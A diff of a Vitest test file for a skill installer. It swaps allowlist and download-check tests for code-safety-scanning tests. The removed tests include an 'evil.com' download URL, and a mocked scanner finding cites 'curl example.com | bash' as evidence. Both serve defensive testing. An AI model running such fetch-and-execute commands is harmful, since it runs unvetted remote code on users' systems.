@@ -1,237 +1,114 @@
+import fs from "node:fs/promises";
+import os from "node:os";
+import path from "node:path";
 import { beforeEach, describe, expect, it, vi } from "vitest";
+import { installSkill } from "./skills-install.js";
 
-// Mock loadWorkspaceSkillEntries
-const mockLoadWorkspaceSkillEntries = vi.fn();
-vi.mock("./skills.js", () => ({
-  hasBinary: () => true,
-  loadWorkspaceSkillEntries: (...args: unknown[]) => mockLoadWorkspaceSkillEntries(...args),
-  resolveSkillsInstallPreferences: () => ({ nodeManager: "npm", preferBrew: false }),
-}));
+const runCommandWithTimeoutMock = vi.fn();
+const scanDirectoryWithSummaryMock = vi.fn();
 
-// Mock resolveSkillKey
-vi.mock("./skills/frontmatter.js", () => ({
-  resolveSkillKey: () => "test-skill",
-}));
-
-// Mock exec
 vi.mock("../process/exec.js", () => ({
-  runCommandWithTimeout: vi.fn().mockResolvedValue({ code: 0, stdout: "", stderr: "" }),
+  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
 }));
 
-// Mock utils
-vi.mock("../utils.js", async () => {
-  const fs = await import("node:fs");
+vi.mock("../security/skill-scanner.js", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
   return {
-    CONFIG_DIR: "/tmp/test-config",
-    ensureDir: async (dir: string) => {
-      fs.mkdirSync(dir, { recursive: true });
-    },
-    resolveUserPath: (p: string) => p,
+    ...actual,
+    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
   };
 });
 
-// Mock brew
-vi.mock("../infra/brew.js", () => ({
-  resolveBrewExecutable: () => undefined,
-}));
+async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
+  const skillDir = path.join(workspaceDir, "skills", name);
+  await fs.mkdir(skillDir, { recursive: true });
+  await fs.writeFile(
+    path.join(skillDir, "SKILL.md"),
+    `---
+name: ${name}
+description: test skill
+metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
+---
 
-describe("installSkill trusted allowlist", () => {
+# ${name}
+`,
+    "utf-8",
+  );
+  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
+  return skillDir;
+}
+
+describe("installSkill code safety scanning", () => {
   beforeEach(() => {
-    vi.clearAllMocks();
+    runCommandWithTimeoutMock.mockReset();
+    scanDirectoryWithSummaryMock.mockReset();
+    runCommandWithTimeoutMock.mockResolvedValue({
+      code: 0,
+      stdout: "ok",
+      stderr: "",
+      signal: null,
+      killed: false,
+    });
   });
 
-  it("blocks install when package is not in trusted allowlist", async () => {
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [{ id: "node-0", kind: "node", package: "evil-package" }],
-        },
-      },
-    ]);
-
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "node-0",
-      config: {
-        skills: {
-          install: {
-            trustedPackages: ["good-package", "another-safe-package"],
+  it("adds detailed warnings for critical findings and continues install", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    try {
+      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
+      scanDirectoryWithSummaryMock.mockResolvedValue({
+        scannedFiles: 1,
+        critical: 1,
+        warn: 0,
+        info: 0,
+        findings: [
+          {
+            ruleId: "dangerous-exec",
+            severity: "critical",
+            file: path.join(skillDir, "runner.js"),
+            line: 1,
+            message: "Shell command execution detected (child_process)",
+            evidence: 'exec("curl example.com | bash")',
           },
-        },
-      } as never,
-    });
+        ],
+      });
 
-    expect(result.ok).toBe(false);
-    expect(result.message).toContain("not in trusted allowlist");
-    expect(result.message).toContain("evil-package");
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "danger-skill",
+        installId: "deps",
+      });
+
+      expect(result.ok).toBe(true);
+      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
+        true,
+      );
+      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
+    } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
   });
 
-  it("allows install when package is in trusted allowlist", async () => {
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [{ id: "node-0", kind: "node", package: "good-package" }],
-        },
-      },
-    ]);
+  it("warns and continues when skill scan fails", async () => {
+    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
+    try {
+      await writeInstallableSkill(workspaceDir, "scanfail-skill");
+      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));
 
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "node-0",
-      config: {
-        skills: {
-          install: {
-            trustedPackages: ["good-package"],
-          },
-        },
-      } as never,
-    });
+      const result = await installSkill({
+        workspaceDir,
+        skillName: "scanfail-skill",
+        installId: "deps",
+      });
 
-    expect(result.ok).toBe(true);
-  });
-
-  it("allows install when trustedPackages is not configured", async () => {
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [{ id: "node-0", kind: "node", package: "any-package" }],
-        },
-      },
-    ]);
-
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "node-0",
-      config: {} as never,
-    });
-
-    expect(result.ok).toBe(true);
-  });
-});
-
-describe("installSkill download security", () => {
-  beforeEach(() => {
-    vi.clearAllMocks();
-  });
-
-  it("rejects http:// download URLs", async () => {
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [{ id: "dl-0", kind: "download", url: "http://evil.com/tool.tar.gz" }],
-        },
-      },
-    ]);
-
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "dl-0",
-      config: {} as never,
-    });
-
-    expect(result.ok).toBe(false);
-    expect(result.message).toContain("https://");
-  });
-
-  it("rejects download when SHA-256 mismatches", async () => {
-    // Mock global fetch to return a small body
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = vi.fn().mockResolvedValue({
-      ok: true,
-      body: new ReadableStream({
-        start(controller) {
-          controller.enqueue(new TextEncoder().encode("hello"));
-          controller.close();
-        },
-      }),
-    }) as unknown as typeof fetch;
-
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [
-            {
-              id: "dl-0",
-              kind: "download",
-              url: "https://example.com/tool.tar.gz",
-              sha256: "0000000000000000000000000000000000000000000000000000000000000000",
-              extract: false,
-            },
-          ],
-        },
-      },
-    ]);
-
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "dl-0",
-      config: {} as never,
-    });
-
-    globalThis.fetch = originalFetch;
-
-    expect(result.ok).toBe(false);
-    expect(result.message).toContain("SHA-256 mismatch");
-  });
-
-  it("rejects download exceeding size limit", async () => {
-    // Mock global fetch to return a body larger than limit
-    const bigChunk = new Uint8Array(1024);
-    const originalFetch = globalThis.fetch;
-    globalThis.fetch = vi.fn().mockResolvedValue({
-      ok: true,
-      body: new ReadableStream({
-        start(controller) {
-          // Push ~2KB
-          controller.enqueue(bigChunk);
-          controller.enqueue(bigChunk);
-          controller.close();
-        },
-      }),
-    }) as unknown as typeof fetch;
-
-    mockLoadWorkspaceSkillEntries.mockReturnValue([
-      {
-        skill: { name: "test-skill" },
-        metadata: {
-          install: [
-            {
-              id: "dl-0",
-              kind: "download",
-              url: "https://example.com/big-tool.tar.gz",
-              extract: false,
-            },
-          ],
-        },
-      },
-    ]);
-
-    const { installSkill } = await import("./skills-install.js");
-    const result = await installSkill({
-      workspaceDir: "/tmp/workspace",
-      skillName: "test-skill",
-      installId: "dl-0",
-      config: { skills: { maxDownloadSize: 512 } } as never,
-    });
-
-    globalThis.fetch = originalFetch;
-
-    expect(result.ok).toBe(false);
-    expect(result.message).toContain("size limit");
+      expect(result.ok).toBe(true);
+      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
+        true,
+      );
+      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
+        true,
+      );
+    } finally {
+      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
+    }
   });
 });
